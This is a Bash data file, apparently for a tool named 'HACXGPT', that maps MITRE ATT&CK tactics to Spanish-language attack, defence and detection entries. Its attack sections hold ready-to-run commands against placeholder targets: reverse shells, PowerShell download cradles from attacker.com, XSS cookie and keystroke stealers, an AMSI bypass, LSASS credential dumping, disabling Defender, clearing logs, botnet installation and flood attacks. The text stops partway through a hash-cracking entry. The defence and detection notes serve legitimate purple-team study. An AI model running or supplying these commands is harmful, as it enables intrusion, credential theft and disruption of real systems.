#!/bin/bash
# ================================================================
# HACXGPT v8.0 — MITRE ATT&CK DATA MODULE
# Cargado con: source mitre_data.sh
# Requiere bash >= 4.0 (arrays asociativos)
# ================================================================

# ----------------------------------------------------------------
# BLOQUE 1: 14 TÁCTICAS ENTERPRISE MATRIX
# ----------------------------------------------------------------
declare -A MITRE_TACTICAS
MITRE_TACTICAS["TA0043"]="🎯 Reconnaissance         | Reconocimiento"
MITRE_TACTICAS["TA0042"]="🔨 Resource Development   | Desarrollo de recursos"
MITRE_TACTICAS["TA0001"]="🚪 Initial Access         | Acceso inicial"
MITRE_TACTICAS["TA0002"]="⚙️  Execution              | Ejecución"
MITRE_TACTICAS["TA0003"]="🔒 Persistence            | Persistencia"
MITRE_TACTICAS["TA0004"]="⬆️  Privilege Escalation   | Escalada de privilegios"
MITRE_TACTICAS["TA0005"]="🕵️  Defense Evasion        | Evasión de defensas"
MITRE_TACTICAS["TA0006"]="🔑 Credential Access      | Acceso a credenciales"
MITRE_TACTICAS["TA0007"]="🔍 Discovery              | Descubrimiento"
MITRE_TACTICAS["TA0008"]="↔️  Lateral Movement       | Movimiento lateral"
MITRE_TACTICAS["TA0009"]="📦 Collection             | Recolección"
MITRE_TACTICAS["TA0011"]="📡 Command and Control    | Mando y control (C2)"
MITRE_TACTICAS["TA0010"]="📤 Exfiltration           | Exfiltración"
MITRE_TACTICAS["TA0040"]="💥 Impact                 | Impacto"

# Orden canónico de tácticas para mostrar en menús
MITRE_ORDEN=("TA0043" "TA0042" "TA0001" "TA0002" "TA0003" "TA0004"
             "TA0005" "TA0006" "TA0007" "TA0008" "TA0009" "TA0011"
             "TA0010" "TA0040")

# ----------------------------------------------------------------
# BLOQUE 2: TÉCNICAS CLAVE POR TÁCTICA (pipe-delimited: ID:Nombre)
# ----------------------------------------------------------------
declare -A MITRE_TECNICAS
MITRE_TECNICAS["TA0043"]="T1595:Active Scanning|T1592:Gather Victim Host Info|T1589:Gather Victim Identity Info|T1591:Gather Victim Org Info|T1598:Phishing for Information"
MITRE_TECNICAS["TA0042"]="T1583:Acquire Infrastructure|T1584:Compromise Infrastructure|T1608:Stage Capabilities|T1587:Develop Capabilities|T1586:Compromise Accounts"
MITRE_TECNICAS["TA0001"]="T1566:Phishing|T1190:Exploit Public-Facing Application|T1133:External Remote Services|T1078:Valid Accounts|T1195:Supply Chain Compromise"
MITRE_TECNICAS["TA0002"]="T1059:Command and Scripting Interpreter|T1053:Scheduled Task/Job|T1204:User Execution|T1047:Windows Management Instrumentation|T1106:Native API"
MITRE_TECNICAS["TA0003"]="T1547:Boot or Logon Autostart|T1053:Scheduled Task/Job|T1505:Server Software Component|T1078:Valid Accounts|T1136:Create Account"
MITRE_TECNICAS["TA0004"]="T1548:Abuse Elevation Control|T1134:Access Token Manipulation|T1068:Exploitation for Privilege Escalation|T1055:Process Injection|T1484:Domain Policy Modification"
MITRE_TECNICAS["TA0005"]="T1027:Obfuscated Files/Info|T1055:Process Injection|T1562:Impair Defenses|T1070:Indicator Removal|T1218:System Binary Proxy Execution"
MITRE_TECNICAS["TA0006"]="T1003:OS Credential Dumping|T1558:Steal or Forge Kerberos Tickets|T1555:Credentials from Password Stores|T1056:Input Capture|T1552:Unsecured Credentials"
MITRE_TECNICAS["TA0007"]="T1082:System Information Discovery|T1083:File and Directory Discovery|T1057:Process Discovery|T1016:System Network Configuration|T1018:Remote System Discovery"
MITRE_TECNICAS["TA0008"]="T1021:Remote Services|T1550:Use Alternate Authentication Material|T1080:Taint Shared Content|T1534:Internal Spearphishing|T1563:Remote Service Session Hijacking"
MITRE_TECNICAS["TA0009"]="T1114:Email Collection|T1005:Data from Local System|T1039:Data from Network Shared Drive|T1113:Screen Capture|T1056:Input Capture"
MITRE_TECNICAS["TA0011"]="T1071:Application Layer Protocol|T1095:Non-Application Layer Protocol|T1572:Protocol Tunneling|T1090:Proxy|T1105:Ingress Tool Transfer"
MITRE_TECNICAS["TA0010"]="T1048:Exfiltration Over Alternative Protocol|T1041:Exfiltration Over C2 Channel|T1567:Exfiltration Over Web Service|T1020:Automated Exfiltration|T1030:Data Transfer Size Limits"
MITRE_TECNICAS["TA0040"]="T1485:Data Destruction|T1486:Data Encrypted for Impact|T1490:Inhibit System Recovery|T1498:Network Denial of Service|T1496:Resource Hijacking"

# ----------------------------------------------------------------
# BLOQUE 2.5: MITRE DATA (Descripción y Ataque)
# Módulo 9: Matriz MITRE (📝 DESCRIPCIÓN ||| 🔴 ATAQUE)
# ----------------------------------------------------------------
declare -A MITRE_DATA

# Auto-poblar datos genéricos para todas las técnicas
for tac in "${!MITRE_TECNICAS[@]}"; do
    IFS='|' read -ra tecs <<< "${MITRE_TECNICAS[$tac]}"
    for tec in "${tecs[@]}"; do
        tid="${tec%%:*}"
        tnom="${tec##*:}"
        
        # Plantilla genérica
        MITRE_DATA["$tid"]="📝 DESCRIPCIÓN:
  La técnica $tid ($tnom) es empleada por cibercriminales y APTs
  dentro de la táctica $tac para comprometer sistemas corporativos.
|||
🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
  • # Reconocimiento / Análisis de vulnerabilidades
    nmap -sV --script vuln TARGET
  • # Simulación genérica de técnica $tid
    echo \"Ejecutando simulación para $tid en TARGET\"
  • # Explotación con Metasploit
    msfconsole -q -x \"set RHOSTS TARGET; run\""
    done
done

# Sobrescribir algunas técnicas clave con comandos específicos
MITRE_DATA["T1566"]="📝 DESCRIPCIÓN:
  Spearphishing Attachment/Link (T1566) envía correos maliciosos a usuarios específicos
  para obtener acceso inicial. Es responsable del 90% de las brechas.
|||
🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
  • # Enviar phishing con adjunto malicioso usando Swaks
    swaks --to victim@TARGET --from it@TARGET --header \"Subject: Urgent Update\" --attach malware.pdf
  • # Framework de Phishing GoPhish
    gophish --campaign TARGET_Users
  • # Phishing iterativo con SET (Social-Engineer Toolkit)
    set-automate payload_creator"

MITRE_DATA["T1190"]="📝 DESCRIPCIÓN:
  Exploit Public-Facing Application (T1190) explota vulnerabilidades en servicios
  expuestos a Internet (Web, VPN, RDP) como VPNs Fortinet o aplicaciones web Apache.
|||
🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
  • # Escaneo de vulnerabilidades masivo con Nuclei
    nuclei -u https://TARGET -t cves/ -severity critical
  • # Explotación de inyección SQL (SQLi)
    sqlmap -u \"https://TARGET/login.php?id=1\" --dbs --batch
  • # Log4Shell (CVE-2021-44228)
    curl -H 'User-Agent: \${jndi:ldap://attacker.com/a}' https://TARGET/api"

MITRE_DATA["T1059"]="📝 DESCRIPCIÓN:
  Command and Scripting Interpreter (T1059) utiliza intérpretes nativos como PowerShell,
  CMD, o Bash para ejecutar comandos maliciosos y evadir controles de seguridad.
|||
🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
  • # Ejecución remota de código en Windows (PowerShell)
    wmiexec.py admin:pass@TARGET \"powershell -enc [Base64_Payload]\"
  • # Reverse shell Bash oneliner en Linux
    ssh root@TARGET \"bash -i >& /dev/tcp/attacker/4444 0>&1\""

# ----------------------------------------------------------------
# BLOQUE 3: PURPLE TEAM DATA — RED + BLUE + DETECCIÓN por técnica
# Formato: ATAQUE|||DEFENSA|||DETECCIÓN
# ----------------------------------------------------------------
declare -A PURPLE_DATA

PURPLE_DATA["T1003"]="
🔴 ATAQUE — OS Credential Dumping:
  • mimikatz.exe privilege::debug sekurlsa::logonpasswords
  • procdump.exe -ma lsass.exe lsass.dmp
  • python3 secretsdump.py domain/user:pass@TARGET
  • Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive
|||
🔵 DEFENSA — Credential Dumping:
  • Habilitar Windows Defender Credential Guard
  • Restringir acceso a LSASS con SACL (auditoría)
  • Deshabilitar WDigest: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest UseLogonCredential=0
  • Activar Protected Users Security Group en AD
  • Usar Managed Service Accounts (MSA/gMSA)
|||
🟣 DETECCIÓN — Credential Dumping:
  • Event ID 4656: Handle a LSASS solicitado
  • Event ID 4663: Acceso al objeto LSASS
  • Sysmon Event ID 10: ProcessAccess a lsass.exe
  • Alertar si procdump/comsvcs acceden a LSASS
  • Monitorear creación de archivos .dmp en rutas del sistema"

PURPLE_DATA["T1566"]="
🔴 ATAQUE — Phishing:
  • gophish → crear campaña con plantilla clonada
  • swaks --to victim@domain.com --from ceo@spoofed.com --attach malware.pdf
  • set toolkit.social_engineering.attack_vectors.spear_phishing
  • evilginx2 -p /phishlets/microsoft365.yaml
  • msfvenom -p windows/meterpreter/reverse_https -f docx
|||
🔵 DEFENSA — Phishing:
  • Implementar DMARC/DKIM/SPF en todos los dominios
  • Activar Safe Links y Safe Attachments (Microsoft Defender)
  • Sandboxing de adjuntos antes de entrega
  • Formación y simulaciones de phishing continuas
  • Reportar y bloquear dominios similares (typosquatting)
|||
🟣 DETECCIÓN — Phishing:
  • Alertas en gateway de email por adjuntos Office con macros
  • Correlacionar clics en URLs externas con inicio de sesión
  • Monitorear procesos hijo de Outlook/Word/Excel
  • UEBA: inicio de sesión nuevo justo tras clic en email
  • DNS: resoluciones a dominios registrados recientemente (<30 días)"

PURPLE_DATA["T1059"]="
🔴 ATAQUE — Command and Scripting Interpreter:
  • powershell -enc [base64_payload]
  • bash -i >& /dev/tcp/attacker.com/4444 0>&1
  • python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
  • wscript.exe //E:jscript payload.js
  • mshta.exe http://attacker.com/payload.hta
|||
🔵 DEFENSA — Scripting Interpreter:
  • Habilitar PowerShell Constrained Language Mode
  • Bloquear scripts no firmados: Set-ExecutionPolicy AllSigned
  • AppLocker/WDAC: whitelist de scripts permitidos
  • Deshabilitar WScript/CScript para usuarios no admin
  • Antivirus con detección de AMSI (Anti-Malware Scan Interface)
|||
🟣 DETECCIÓN — Scripting Interpreter:
  • PowerShell Script Block Logging (Event 4104)
  • PowerShell Module Logging (Event 4103)
  • Alertar en: -enc, -nop, -w hidden, IEX, DownloadString
  • Sysmon ID 1: Creación de procesos powershell/cmd/wscript
  • SIEM: correlación de comandos ofuscados base64"

PURPLE_DATA["T1055"]="
🔴 ATAQUE — Process Injection:
  • CreateRemoteThread en proceso legítimo (svchost.exe)
  • Shellcode via VirtualAllocEx + WriteProcessMemory
  • msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll
  • Reflective DLL Injection con PowerSploit
  • Process Hollowing: reemplazar código en proceso suspendido
|||
🔵 DEFENSA — Process Injection:
  • Habilitar Arbitrary Code Guard (ACG) en políticas de proceso
  • Windows Defender Exploit Guard: Code Integrity Guard
  • EDR con detección de comportamiento de inyección
  • Limitar CreateRemoteThread a procesos de sistema
  • Integridad de procesos críticos: PPL (Protected Process Light)
|||
🟣 DETECCIÓN — Process Injection:
  • Sysmon ID 8: CreateRemoteThread detectado
  • Sysmon ID 25: ProcessTampering
  • Alertar en: VirtualAllocEx, WriteProcessMemory desde proceso no-sistema
  • Memoria RWX (Read-Write-Execute) en proceso legítimo
  • Correlacionar proceso padre inesperado (explorer → cmd → powershell)"

PURPLE_DATA["T1078"]="
🔴 ATAQUE — Valid Accounts:
  • crackmapexec smb TARGET -u users.txt -p passwords.txt
  • kerbrute userenum --dc DC01 -d domain.local users.txt
  • hydra -L users.txt -P passes.txt rdp://TARGET
  • Usar credenciales encontradas en repositorios (GitHub dorks)
  • Pass-the-Hash: pth-winexe -U 'admin%aad3b435:NTLM_HASH' //TARGET cmd
|||
🔵 DEFENSA — Valid Accounts:
  • MFA obligatorio para todos los accesos remotos
  • Política de contraseñas: mínimo 16 caracteres, complejidad
  • Privileged Access Workstations (PAW) para admins
  • Revisión periódica de cuentas inactivas (deshabilitarlas)
  • Just-in-Time (JIT) acceso para cuentas privilegiadas
|||
🟣 DETECCIÓN — Valid Accounts:
  • Event ID 4625: Inicio de sesión fallido (múltiples = ataque)
  • Event ID 4624 Type 3/10: inicio de sesión de red/remoto
  • UEBA: inicio de sesión en horario inusual o desde IP nueva
  • Alertar en: logins desde países fuera del baseline
  • Correlacionar: fallo de MFA repetido + inicio de sesión exitoso"

PURPLE_DATA["T1021"]="
🔴 ATAQUE — Remote Services:
  • psexec.py domain/user:pass@TARGET cmd.exe
  • evil-winrm -i TARGET -u admin -p password
  • ssh -L 3389:INTERNAL:3389 user@jump-host (túnel RDP)
  • wmiexec.py domain/user:pass@TARGET 'ipconfig'
  • smbclient //TARGET/C$ -U admin%password
|||
🔵 DEFENSA — Remote Services:
  • Desactivar RDP donde no sea necesario
  • RDP solo accesible desde red de gestión / VPN
  • SMB: bloquear SMBv1, requerir firma SMB
  • Segmentar red: servidores no deben comunicarse directamente
  • Firewall de host: restringir puertos 22, 445, 5985, 3389
|||
🟣 DETECCIÓN — Remote Services:
  • Event ID 4648: Inicio de sesión con credenciales explícitas
  • Event 7045: Servicio instalado (psexec crea servicio)
  • Sysmon ID 3: Conexión de red a puerto 445/3389/5985
  • NetFlow: conexiones laterales este-oeste inusuales
  • EDR: alert en psexec.exe, wmiexec, evil-winrm"

PURPLE_DATA["T1027"]="
🔴 ATAQUE — Obfuscated Files/Info:
  • Invoke-Obfuscation -ScriptBlock {...} -Command Token\\All\\1
  • certutil -encode malware.exe encoded.b64
  • echo payload | base64 | xargs -I{} bash -c 'echo {}|base64 -d|bash'
  • Chameleon: ofuscación de scripts PowerShell automática
  • py2exe + UPX para comprimir y cifrar ejecutables
|||
🔵 DEFENSA — Obfuscation:
  • AMSI: interface de escaneo que decodifica antes de ejecutar
  • EDR con análisis de comportamiento (no solo firmas)
  • PowerShell Script Block Logging detecta código decodificado
  • YARAify: reglas YARA para detectar ofuscación común
  • Prohibir certutil para descargar/codificar en endpoints
|||
🟣 DETECCIÓN — Obfuscation:
  • Event 4104: Script Block completo (ya decodificado) en PowerShell
  • Alertar en: alto ratio de caracteres especiales en comandos
  • Detectar uso de certutil -decode/-encode en contexto inusual
  • SIEM: comandos PowerShell con -enc o IEX y longitud > 500 chars
  • Strings de AMSI bypass conocidos (strings, hex, unicode)"

PURPLE_DATA["T1562"]="
🔴 ATAQUE — Impair Defenses (Disable AV/EDR):
  • Set-MpPreference -DisableRealtimeMonitoring \$true
  • sc stop WinDefend && sc config WinDefend start=disabled
  • taskkill /F /IM MsMpEng.exe
  • wmic /namespace:\\\\root\\microsoft\\windows\\defender path MSFT_MpPreference call Add ExclusionPath=\"C:\\temp\"
  • Killing EDR via vulnerable driver (BYOVD)
|||
🔵 DEFENSA — Impair Defenses:
  • Tamper Protection en Microsoft Defender (bloquea cambios)
  • Proteger servicios de seguridad como PPL
  • Centralizar logs en SIEM externo (no en el endpoint)
  • Alertar si Windows Defender se detiene o es modificado
  • MDM/GPO: impedir que usuarios deshabiliten AV
|||
🟣 DETECCIÓN — Impair Defenses:
  • Event ID 7036: Servicio detenido (WinDefend, Sysmon)
  • Event ID 4657: Modificación de clave de registro (Malware\\MpPreference)
  • Alertar en: exclusiones añadidas a AV por usuario no-administrador
  • EDR: kill de procesos de seguridad (MsMpEng, CSFalconService)
  • Heartbeat monitoring: si agente EDR deja de reportar → alerta"

PURPLE_DATA["T1190"]="
🔴 ATAQUE — Exploit Public-Facing Application:
  • nuclei -u https://TARGET -t cves/ -severity critical,high
  • sqlmap -u 'https://TARGET/page?id=1' --dbs --batch
  • CVE-2024-3400: curl -X POST https://TARGET/ssl-vpn/hipreport.esp -d cmd=id
  • Log4Shell: \${jndi:ldap://attacker.com/x} en User-Agent
  • CVE-2024-21762: curl -X POST https://fortigate/api/v2/cmdb/ --path-traversal
|||
🔵 DEFENSA — Exploit Public-Facing:
  • WAF con reglas OWASP (ModSecurity, Cloudflare, AWS WAF)
  • Parcheo urgente: VPN < 72h, servidores web < 30 días
  • Superficie de ataque mínima: desactivar servicios no necesarios
  • Bug Bounty + Pentest externo anual
  • Virtual patching en WAF mientras llega el parche oficial
|||
🟣 DETECCIÓN — Exploit Public-Facing:
  • WAF logs: reglas disparadas, especialmente en paths /api/, /admin/
  • IDS/IPS: firmas de exploits conocidos (Snort, Suricata)
  • Alertar en: errores 500 masivos en aplicación web
  • Honeypot: endpoint falso que alerta cuando es accedido
  • Correlación: WAF block + escaneo de vulnerabilidades desde misma IP"

PURPLE_DATA["T1053"]="
🔴 ATAQUE — Scheduled Task/Job:
  • schtasks /create /tn Updater /tr C:\\payload.exe /sc minute /mo 5
  • at 23:00 /every:M,T,W,TH,F,SA,SU cmd /c payload.exe
  • crontab -e → */5 * * * * /tmp/backdoor.sh
  • New-ScheduledTask -Action (New-ScheduledTaskAction -Execute payload.ps1)
  • WMI: Event Subscription permanente (MOF file)
|||
🔵 DEFENSA — Scheduled Tasks:
  • Monitorear y auditar todas las tareas programadas
  • Restringir creación de tareas a administradores
  • PowerShell JEA: limitar qué comandos puede ejecutar cada rol
  • Revisión periódica de cron jobs y tareas de Windows
  • AppLocker: bloquear ejecutables desde rutas temp/usuario
|||
🟣 DETECCIÓN — Scheduled Tasks:
  • Event ID 4698: Tarea programada creada
  • Event ID 4702: Tarea programada modificada
  • Sysmon ID 1: Proceso creado por svchost.exe (TaskSched)
  • Alertar en: tareas que ejecutan desde AppData, Temp, ProgramData
  • Linux: cambios en /etc/cron* o /var/spool/cron con auditd"

# ----------------------------------------------------------------
# BLOQUE 4: ACTORES DE AMENAZA (APT)
# ----------------------------------------------------------------
declare -A APT_INFO
APT_INFO["APT29"]="Cozy Bear | Russia (SVR) | Espionaje gubernamental | Gobierno, Think Tanks, ONG, Salud"
APT_INFO["APT38"]="Lazarus Group | Corea del Norte (RGB) | Financiero / Destrucción | Bancos, Exchange cripto, Defensa"
APT_INFO["FIN7"]="Carbanak Group | Criminal financiero | Fraude y ransomware | Retail, Hospitalidad, Finanzas"

declare -A APT_TECNICAS
APT_TECNICAS["APT29"]="T1566.001:Spear Phishing Attachment|T1059.001:PowerShell|T1053.005:Scheduled Task|T1078:Valid Accounts|T1021.001:Remote Desktop Protocol|T1027:Obfuscation|T1070.004:File Deletion|T1071.001:Web Protocols C2|T1041:Exfil over C2"
APT_TECNICAS["APT38"]="T1566.001:Spear Phishing|T1059.003:Windows Command Shell|T1055:Process Injection|T1071.001:HTTP C2|T1041:Exfil over C2|T1485:Data Destruction|T1486:Ransomware|T1090:Proxy|T1105:Ingress Tool Transfer"
APT_TECNICAS["FIN7"]="T1566.001:Spear Phishing|T1059.001:PowerShell|T1027:Obfuscation|T1055.001:DLL Injection|T1486:Data Encrypted for Impact|T1119:Automated Collection|T1056.001:Keylogging|T1071.001:HTTP C2|T1078:Valid Accounts"

declare -A APT_DATA
APT_DATA["APT29"]="T1566.001 - Spearphishing Attachment:
  • Enviar correo con archivo .iso malicioso adjunto conteniendo un acceso directo .lnk.
  • Payload (Ej): powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')\"
|||
T1059.001 - PowerShell:
  • Ejecutar el dropper encubierto en memoria sin tocar disco (fileless malware).
  • Bypass AMSI: [Ref.Assembly]::GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)
|||
T1053.005 - Scheduled Task:
  • Establecer persistencia: schtasks /create /tn \"WindowsUpdateRunner\" /tr \"C:\\Windows\\System32\\cmd.exe /c start /b powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/persist')\" /sc onlogon
|||
T1078 - Valid Accounts:
  • Comprometer credenciales locales mediante volcado de LSASS y escalar.
  • mimikatz privilege::debug sekurlsa::logonpasswords
|||
T1021.001 - Remote Desktop Protocol (RDP):
  • Movimiento lateral desde el equipo comprometido hacia servidores críticos.
  • xfreerdp /u:Administrador /p:Password /v:TARGET
|||
T1027 - Obfuscation:
  • Ofuscar scripts y tráfico para evadir EDR.
  • Base64 encode cmds: powershell -e [B64]
|||
T1070.004 - File Deletion:
  • wevtutil cl Security
  • Remove-Item -Path C:\\Windows\\Temp\\* -Recurse -Force
|||
T1071.001 - Web Protocols C2:
  • Mantener baliza C2 usando HTTPS imitando tráfico de redes sociales.
|||
T1041 - Exfiltration Over C2 Protocol:
  • Comprimir datos financieros y robarlos usando el mismo canal C2."

APT_DATA["APT38"]="T1566.001 - Spearphishing:
  • Enviar documentos ofimáticos (Word/Excel) con macros maliciosas de reclutamiento falso.
|||
T1059.003 - Windows Command Shell:
  • Descargar 2stg shellcode: certutil -urlcache -split -f http://evil.com/payload.exe %TEMP%\\svchost.exe
|||
T1055 - Process Injection:
  • Inyectar shellcode en memoria usando inyección reflexiva (Process Hollowing).
|||
T1071.001 - HTTP C2:
  • Beaconing usando infraestructura previamente comprometida (bancos vulnerables).
|||
T1105 - Ingress Tool Transfer:
  • Descargar Cobalt Strike y herramientas de limpiado financiero (SWIFT manipulation).
|||
T1090 - Proxy:
  • Configurar túneles usando servicios legítimos (e.g. ngrok o ssh tunneling) hacia TARGET.
|||
T1041 - Exfiltration Over C2 Protocol:
  • Robar credenciales financieras de bases de datos internas.
|||
T1485 - Data Destruction:
  • sdelete.exe -z C:\\Archivos_Criticos o Cipher.exe /w:C:\\
|||
T1486 - Data Encrypted for Impact (Ransomware):
  • Cifrar discos duros enteros para ocultar las huellas del robo bancario (WannaCry-style)."

APT_DATA["FIN7"]="T1566.001 - Spear Phishing:
  • Quejas falsas de clientes con archivos ZIP/VBS maliciosos.
|||
T1059.001 - PowerShell:
  • Ejecutar scripts en memoria (.js o vba inicial desencadena PS).
|||
T1027 - Obfuscation:
  • Ofuscar binarios y scripts (Halfbaked backdoor) empaquetados pesadamente.
|||
T1055.001 - DLL Injection:
  • Carga lateral de DLLs (Side-loading) para camuflaje.
|||
T1056.001 - Keylogging:
  • Instalación de keyloggers en terminales de Punto de Venta (POS) en TARGET.
|||
T1078 - Valid Accounts:
  • Utilizar admin de Active Directory robado para moverse lateralmente por toda la red.
|||
T1119 - Automated Collection:
  • Scripts automatizados raspan tarjetas de crédito de memoria RAM (BlackPOS).
|||
T1071.001 - HTTP C2:
  • Uso de dominios que imitan sitios legales (Google/MSFT) para C2.
|||
T1486 - Data Encrypted for Impact:
  • Uso intermitente de ransomware (DarkSide / REvil) post-extracción de tarjetas."

# Los extras (mitre_extras_1, 2, 3) 
# ahora son importados directamente por hacx_advanced.sh

# ----------------------------------------------------------------
# BLOQUE 4.5: MÓDULO 7 CHAT LIBRE
# Formato Purple Team: 🔴 ATAQUE ||| 🔵 DEFENSA ||| 🟣 DETECCIÓN
# ----------------------------------------------------------------
declare -A CHAT_DATA

CHAT_DATA["ddos"]="🔴 ATAQUE - Denegación de Servicio (DDoS):
  • SYN Flood: hping3 -S -p 80 --flood --rand-source CHAT_TARGET
  • HTTP Flood: bombardier -c 1000 -d 60s https://CHAT_TARGET
  • Slowloris: slowloris CHAT_TARGET -s 500
  • Amplificación DNS: python3 dns_amplification.py CHAT_TARGET -p 53
|||
🔵 DEFENSA - Mitigación DDoS:
  • Cloudflare: Habilitar protección DDoS automática (Under Attack Mode)
  • WAF: Configurar rate limiting (ej. 100 req/min por IP)
  • Firewall/BGP: Bloquear puertos no necesarios (53/123) / RTBH
|||
🟣 DETECCIÓN - Tráfico Anómalo:
  • NetFlow: Aumento súbito de tráfico asimétrico a puertos específicos
  • Logs de Firewall: Múltiples conexiones SYN desde IPs aleatorias
  • Monitoreo de Host: Picos inusuales de CPU/Memoria en servidores web"

CHAT_DATA["sql"]="🔴 ATAQUE - Inyección SQL (SQLi):
  • Detectar vulnerabilidad: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" --batch
  • Extraer bases de datos: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" --dbs
  • Dump de tablas: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" -D database --tables
  • Levantar OS Shell: sqlmap -u \"http://CHAT_TARGET/pagina.php?id=1\" --os-shell
|||
🔵 DEFENSA - Prevenir Inyecciones:
  • Back-end: Uso estricto de Prepared Statements (Parametrized queries)
  • WAF: Aplicar reglas OWASP Top 10 contra SQLi (ej. ModSecurity)
  • Frontend/Backend: Validación y sanitización estricta de variables input
|||
🟣 DETECCIÓN - Intentos SQLi:
  • Event ID 4625 (o syslogs): Múltiples intentos de login fallidos con caracteres especiales
  • Web Server Logs (Nginx/Apache): Patrones de URI con ' OR '1'='1 o %27%20OR%20
  • DB Logs (SQL Server/MySQL): Errores de sintaxis anómalos consecutivos"

CHAT_DATA["kerberoasting"]="🔴 ATAQUE - Kerberoasting (T1558.003):
  • Enumerar SPNs: GetUserSPNs.py [dominio]/[usuario]:[pass] -dc-ip CHAT_TARGET
  • Solicitar TGS para offline cracking: python3 GetUserSPNs.py [dominio]/[usuario]:[pass] -request
  • Crackear offline (Hashcat): hashcat -m 13100 hash.txt rockyou.txt
  • Crackear offline (John): john --format=krb5tgs --wordlist=rockyou.txt hash.txt
|||
🔵 DEFENSA - Protección de Kerberos:
  • Política de contraseñas: Usar contraseñas largas y complejas (>25 caracteres) para cuentas de servicio
  • Managed Service Accounts: Implementar Group Managed Service Accounts (gMSA)
  • Active Directory: Habilitar Protected Users security group para cuentas críticas
|||
🟣 DETECCIÓN - Solicitudes TGS Inusuales:
  • Event ID 4769: Múltiples solicitudes de TGS Ticket (Success o Failure) solicitadas muy rápido para la misma cuenta
  • Tráfico de Red: Solicitudes anómalas de tickets Kerberos fuera de horario laboral habitual
  • SIEM: Correlación de cifrado débil (RC4 - 0x17) en el Ticket Encryption Type extraído"

CHAT_DATA["botnet"]="🔴 ATAQUE - Botnet y C2 (T1078 / T1071):
  • Infección: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf > bot.elf
  • Instalar bot persistente: scp bot.elf root@CHAT_TARGET:/tmp/ && ssh root@CHAT_TARGET 'chmod +x /tmp/bot.elf && nohup /tmp/bot.elf &'
  • C2 HTTP: curl -s http://CHAT_TARGET/c2/tasks → el bot ejecuta órdenes remotas
  • DNS Tunneling: dnscat2 --secret=mysecret CHAT_TARGET (túnel C2 sobre DNS)
  • DDoS con botnet: hping3 -S -p 80 --flood --rand-source CHAT_TARGET
|||
🔵 DEFENSA - Prevención de Botnets:
  • Segmentación de red: aislar hosts comprometidos con VLANs y ACLs
  • Filtrado DNS saliente: bloquear resolución de dominios DGA o recientes
  • EDR/XDR: detectar procesos persistentes anómalos y reverse shells
  • UEBA: tráfico saliente anómalo en horario nocturno hacia IPs desconocidas
|||
🟣 DETECCIÓN - Indicadores de Compromiso (IoC):
  • Sysmon ID 3: Conexiones de red hacia IPs externas desde procesos del sistema
  • DNS: Consultas a dominios con alta entropía (generados por DGA)
  • NetFlow: Beaconing periódico (pings al C2 cada N segundos exactos)
  • Event ID 4697/7045: Servicio instalado de forma inusual"

CHAT_DATA["xss"]="🔴 ATAQUE - Cross-Site Scripting XSS (T1059.007):
  • Reflected XSS probe: curl 'https://CHAT_TARGET/search?q=<script>alert(1)</script>'
  • Stored XSS payload: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
  • DOM XSS: <img src=x onerror=\"fetch('https://attacker.com/?d='+document.domain)\">
  • Keylogger XSS: <script>document.onkeypress=e=>{fetch('//attacker.com/?k='+e.key)}</script>
  • Tool: xsstrike -u https://CHAT_TARGET/search --fuzzer
|||
🔵 DEFENSA - Prevención XSS:
  • Content Security Policy (CSP): Content-Security-Policy: default-src 'self'
  • Output encoding: Escapar < > & \" ' antes de renderizar en HTML
  • HttpOnly + Secure en cookies: Set-Cookie: sessionid=...; HttpOnly; Secure; SameSite=Strict
  • Sanitización: usar DOMPurify (JS) o Bleach (Python) para limpiar inputs
|||
🟣 DETECCIÓN - Intentos de XSS:
  • WAF Logs: Patrones <script>, onerror=, javascript: en parámetros de peticiones
  • SIEM: Request con User-Agent o parámetros con codificación base64 o unicode anómala
  • Correlación: múltiples errores 400/403 con payloads similares en ventana corta de tiempo"

CHAT_DATA["phishing"]="🔴 ATAQUE - Phishing (T1566):
  • Clone & Phish: gophish → clonar login de CHAT_TARGET, enviar campaña a usuarios
  • Adjunto malicioso: msfvenom -p windows/meterpreter/reverse_https LHOST=attacker LPORT=443 -f docx
  • Email spoofing: swaks --to victim@CHAT_TARGET --from IT@CHAT_TARGET --server mail.CHAT_TARGET --header 'Subject: Reset urgente'
  • Evilginx2: proxy inverso para capturar tokens 2FA en login de CHAT_TARGET
  • Typosquatting: registrar ch4t-target.com y redirigir usuarios de CHAT_TARGET
|||
🔵 DEFENSA - Anti-Phishing:
  • Email: Configurar DMARC p=reject + DKIM + SPF estricto para CHAT_TARGET
  • ATP: Activar Safe Links y Safe Attachments en Microsoft 365 / Google Workspace
  • Awareness: Simulaciones de phishing mensuales + formación OSCP-style
  • DNS: Monitorear dominios typosquatting de CHAT_TARGET con servicios como dnstwist
|||
🟣 DETECCIÓN - Indicadores de Phishing:
  • Email Gateway logs: adjuntos .docx/.xlsm con macros sospechosas enviados masivamente
  • SIEM: Proceso hijo de Outlook/Word/Excel → cmd.exe o powershell.exe
  • DNS: Resolución de dominio registrado en últimas 72h desde red corporativa
  • UEBA: Primer acceso exitoso desde país no habitual justo tras clic en email sospechoso"

CHAT_DATA["hash"]="🔴 ATAQUE - Hash Cracking y Dumping (T1003 / T1110):
  • Dump NTLM (Windows): secretsdump.py DOMAIN/admin:pass@CHAT_TARGET
  • Dump Linux: ssh root@CHAT_TARGET 'cat /etc/shadow' > shadow.txt
  • Crackear MD5: hashcat -m 0 -a 0 hash.txt rockyou.txt
  • Crackear NTLM: hashcat -m 1000 ntlm.txt rockyou.txt --rules=best64.rule
  • Crackear SHA256: hashcat -m 1400 sha256.txt -a 3 ?u?l?l?l?d?d
